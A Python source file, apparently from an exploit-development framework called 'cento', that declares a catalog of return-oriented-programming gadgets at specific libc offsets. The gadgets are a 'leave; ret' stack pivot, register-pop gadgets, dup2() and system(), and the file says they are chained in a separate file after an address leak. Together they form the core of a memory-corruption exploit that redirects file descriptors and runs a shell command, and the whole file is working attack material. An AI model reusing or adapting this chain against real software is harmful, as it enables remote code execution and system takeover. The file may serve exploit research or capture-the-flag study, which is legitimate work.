# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
"""The ropper catalog, as declarations: each class below is one ropper line. entry is where
the gadget lives -- symbolic (LIBC + offset) until the leak binds; the role-fields are what
its pops consume; needs are what it reads. enhanced.py lays these into the checked chain."""

import cento
from cento.abi.x86_64 import CALL_ENTRY_SP_MOD

LIBC = cento.Ref("libc_base")  # leak #1: bound at throw time


class LeaveRet(cento.Gadget, entry=LIBC + 0x04B9D1, frame_base="rbp", sp_pivot=True, stride=0x10):
    """libc_base+0x4b9d1: leave; ret"""

    rbp = cento.Restores("rbp", at=0x0, width=cento.u64)  # pop rbp: the NEXT frame
    pc = cento.Restores(cento.Reg.PC, at=0x8, width=cento.u64)  # ret: first move inside this frame
    needs = {"rbp": "the frame this pivots into"}


class PopRdi(cento.Gadget, entry=LIBC + 0x02A3E5, stride=0x10):
    """libc_base+0x2a3e5: pop rdi; ret"""

    rdi = cento.Restores("rdi", at=0x0, width=cento.u64)
    pc = cento.Restores(cento.Reg.PC, at=0x8, width=cento.u64)


class PopRsiR15(cento.Gadget, entry=LIBC + 0x02BE51, stride=0x18):
    """libc_base+0x2be51: pop rsi; pop r15; ret (no bare pop rsi in this libc)"""

    rsi = cento.Restores("rsi", at=0x0, width=cento.u64)
    r15 = cento.Restores("r15", at=0x8, width=cento.u64)  # junk: the pop pair drags it along
    pc = cento.Restores(cento.Reg.PC, at=0x10, width=cento.u64)


class Dup2Call(cento.Gadget, entry=LIBC + 0x0EB0B0, stride=0x8, entry_sp_mod=CALL_ENTRY_SP_MOD):
    """libc_base+0xeb0b0: dup2()"""

    pc = cento.Restores(cento.Reg.PC, at=0x0, width=cento.u64)  # dup2 returns onto the next qword
    needs = {"rdi": "oldfd", "rsi": "newfd"}


class RetAlign(cento.Gadget, entry=LIBC + 0x029CD6, stride=0x8):
    """libc_base+0x29cd6: ret"""

    pc = cento.Restores(cento.Reg.PC, at=0x0, width=cento.u64)


class SystemCall(cento.Gadget, entry=LIBC + 0x052290, stride=0, entry_sp_mod=CALL_ENTRY_SP_MOD):
    """libc_base+0x52290: system() -- nothing after this returns"""

    needs = {"rdi": "the command string"}
